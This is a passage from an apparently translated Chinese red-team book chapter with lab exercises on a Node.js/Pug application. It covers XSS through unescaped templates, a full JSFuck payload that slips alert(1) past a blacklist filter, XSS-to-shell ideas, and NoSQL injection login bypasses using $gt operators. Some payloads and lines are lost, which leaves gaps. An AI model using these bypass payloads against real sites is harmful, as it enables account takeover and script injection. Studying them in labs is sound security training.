顺便说一句，下面是一个小小的改变，正确的方法是在插值周围添加引号：
Pug 模板源代码
script.
var user3="#{name3}"
练习4
在这个例子中，我们有 Pug 非转义代码，由 != 表示，因为没有转义，所以它很容易受到 XSS 的攻击。因此，在这种
情况下，我们可以对输入字段使用简单的   样式攻击。
Pug 模板源代码：
p != 'No results found for '+name4
尝试输入 payload：
点击提交后，我们应该看到弹出窗口。你可以通过查看页面源代码并搜索“alert”进行验证。
练习5
假设我们得到一个使用转义字符串插值和某种类型的过滤的应用程序。在下面的练习中，我们在 NodeJS 服务器中执
行规则最小的黑名单过滤脚本，删除“”和“alert”等字符。但是，他们再次错误地将我们的转义字符串插值放在
script 标签中。如果我们可以在那里利用 JavaScript，我们就可以发现一个 XSS：
打开练习5
Pug 模板源代码
name5 = req.query.name5.replace(/[;’"<>=]|alert/g,"")
script.
var user3 = #{name5};
尝试输入 payload
你可以尝试 alert(1)，但由于过滤器不起作用。你也可以尝试像  这样的东
西，但转义代码和过滤器会拦截我们。如果我们真的想获得能利用 alert(1)的 payload，我们该怎么办？
我们需要弄清楚如何绕过过滤器来插入原始 JavaScript。请记住，JavaScript 功能非常强大，并且具有许多功
能。我们可以利用此功能来提供一些新颖的 payload。绕过这些过滤器的一种方法是使用新颖的 JavaScript 表
示方法。这可以通过名为 http://www.jsfuck.com/ 的站点创建。如下所示，通过使用括号，括号，加号和感叹
号，我们可以重新创建 alert(1)。
JSF*ck Payload：
[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+
[]+!+[]+!+[]]+(!![]+[])[+!+[]]][([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+
[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!!
[]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])
[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+
[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+
[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+
[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+
[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])
[+!+[]]]((![]+[])[+!+[]]+(![]+[])[!+[]+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]+(!!
[]+[])[+[]]+(![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])
[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[!+[]+!+[]+[+[]]]+[+!+[]]+(!![]+[][(![]+
[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+
[]+!+[]]+(!![]+[])[+!+[]]])[!+[]+!+[]+[+[]]])() 
如你所知，许多浏览器已开始包含 XSS 保护机制。我们甚至可以使用这些 payload 来绕过某些浏览器保护。尝试在
Kali 之外的真实浏览器中使用它们，例如 Chrome。
在复杂的应用程序上触发 XSS 并不容易。很容易忽视或误解框架如何处理输入和输出。因此，在为 Pug/NodeJS 应
用程序执行源代码审查时，在源代码中搜索 !{ ， #{  或 ${  有助于可能触发 XSS 的位置。了解上下文，以及是否需
要在该上下文中进行转义，这是至关重要的，我们将在以下示例中看到。
尽管这些攻击特定于 Node 和 Pug，但每种语言都存在针对 XSS 和输入验证的问题。你将无法运行漏洞扫描程序或
XSS 模糊测试工具并找到所有 XSS 漏洞。但你确实需要了解所使用的语言和框架。
从 XSS 到 shell
我经常遇到的一个问题是，我如何通过 XSS 获取 Shell？尽管有许多不同的方法可以做到这一点，但我们通常会发
现，如果我们可以让用户在内容管理系统（CMS）或类似系统中获得管理员的 XSS，那么这可能会导致系统完全受
损。可以在这里找到 Hans-Michael 完整的演练示例和代码：https://github.com/Varbaek/xsser 。 Hans-Michael
提供了一些关于重建 XSS 到 RCE 攻击的精彩示例和视频。
我喜欢使用涉及利用 JavaScript 功能的自定义红队攻击。我们知道 JavaScript 非常强大，我们在 BeEF（浏览器开发
框架）中看到过这样的功能。因此，我们可以利用所有这些功能来执行受害者不知情的攻击。这个 payload 会做些
什么？攻击的一个示例是让受害者计算机上运行的 JavaScript XSS payload 获取受害者的内部（自然）IP 地址。然
后，我们可以获取其 IP 地址并开始使用我们的 payload 扫描其内部网络。如果我们发现一个允许在没有身份验证的
情况下就可以登入的 Web 应用程序，我们就可以向该服务器发送 payload。
例如，我们的目标可能是 Jenkins 服务器，我们知道如果可以未经身份验证登录的话，几乎可以完成远程代码执行。
要查看 XSS 与 Jenkins 入侵的完整演练，请参阅第5章 - 利用社会工程攻击内网 Jenkins。
NoSQL 注入
在前两本书中，我们花了相当多的时间学习如何进行 SQL 注入和使用 SQLMap。除了对 Burp Suite 的一些混淆和集
成之外，本书对比上本书没有太大变化。相反，我想深入研究 NoSQL 注入，因为这些数据库变得越来越普遍。
MySQL，MSSQL 和 Oracle 等传统 SQL 数据库依赖于关系数据库中的结构化数据。这些数据库是关系型的，这意味
着一个表中的数据与其他表中的数据有关。这样可以轻松执行查询，例如“列出所有在过去30天内购买东西的客户”。
对这些数据的要求是，数据的格式必须在整个数据库中保持一致。NoSQL 数据库由通常不遵循表格/关系模型的数据
组成，如 SQL 查询数据库中所示。这些称为“非结构化数据”（如图片，视频，社交媒体）的数据并不适用于我们的大
量收集数据。
NoSQL 功能：
NoSQL 数据库的类型：Couch/MongoDB
非结构化数据
水平化增长
在传统的 SQL 注入中，攻击者会尝试破坏 SQL 查询语句并在服务器端修改查询语句。使用 NoSQL 注入，攻击可以
在应用程序的其他区域中执行，而不是在传统的 SQL 注入中执行。此外，在传统的 SQL 注入中，攻击者会使用一个
标记来发起攻击。在 NoSQL 注入中，在NoSQL注入中，通常存在将字符串解析或评估为NoSQL调用的漏洞。
NoSQL 注入中的漏洞通常在以下情况下发生：（1）端点接受的 JSON 数据是从 NoSQL 数据库中请求的，以及
（2）我们能够使用 NoSQL 比较运算符操作查询来更改 NoSQL 查询。
NoSQL 注入的一个常见例子是注入类似的东西： [{"$gt":""}] 。这个 JSON 对象基本上是说运算符（ $gt ）大于
NULL("")。由于逻辑上一切都大于 NULL，因此 JSON 对象成为一个真正正确的语句，允许我们绕过或注入 NoSQL
查询。这相当于 SQL 注入世界中的[' or 1=1—]。在 MongoDB 中，我们可以使用以下条件运算符之一：
(>)大于 - $gt
(=)大于等于 - $gte
(
{"username"："admin"，"password"：{"$gt"：""}}
你现在应该可以以管理员身份登录！
那么这里发生了什么呢？我们将字符串 "GuessingAdminPassword" 更改为JSON对象 {"$gt":""} ，这是 TRUE 语
句，因为大于 NULL 的所有内容都为 TRUE。这将 POST 请求更改为 {"username":"admin", "password":TRUE
} ，它自动使请求为 TRUE 并以管理员身份登录而不需要知道密码，类似 SQLi 中的 1 = 1 攻击。
高级 NoSQLi
NoSQL 注入并不新鲜，但 NodeJS 章节的目的是展示更新的框架和语言以及如何潜在地引进新的漏洞。例如，
Node.js 有一个 qs 模块，它具有将 HTTP 请求参数转换为 JSON 对象的特定语法。默认情况下，qs 模块在 Express
中使用“body-parser”中间件的一部分。
qs 模块：一个查询字符串解析和字符串化库，增加了一些安全性。[https://www.npmjs.com/package/qs]
这是什么意思？如果使用 qs 模块，如果在参数中使用括号表示法，POST 请求将在服务器端转换为 JSON。因此，看
起来像用户名 [value] = admin&password [value] = admin 的 POST 请求将转换为 {"username"：
{"value"："admin"}，"password"：{"value"："admin" }} 。现在，qs 模块也将接受并转换 POST 参数以协助
NoSQLi：
例如，我们可以发出如下的 POST 请求：
username=admin&password[$gt]=
服务器端请求转换将转换为：
{"username": "admin", "password":{"$gt":""}
现在看起来类似于传统的 NoSQLi 攻击。
现在，我们的请求看起来与上一节中的 NoSQLi 相同。让我们看看这个操作：
转到 http://chat:3000/nosql2
打开 Burp Intercept
使用 admin 登录：
修改 POST 参数：
username=admin&password[$gt]=&submit=login
你应该可以使用 admin 登录了！你已使用 Express Framework 使用的 qs 模块解析器执行 NoSQL 注入，作为解析
器中间件的一部分。但等等，还有更多！如果你不知道要攻击哪个用户名怎么办？我们可以使用同样的攻击来查找和
登录其他帐户吗？
如果不是使用密码的话，那我们也可以尝试使用用户名吗？在这种情况下，NoSQLi POST 请求看起来像：
username[$gt]=admin&password[$gt]=&submit=login
上面的 POST 请求实际上是在数据库中查询下一个大于 admin 的用户名，并使用密码字段生成一个 TRUE 语句。如
果成功，你应该在管理员之后按字母顺序作为下一个用户登录。继续这样做，直到找到 superaccount 。
更多 NoSQL Payload：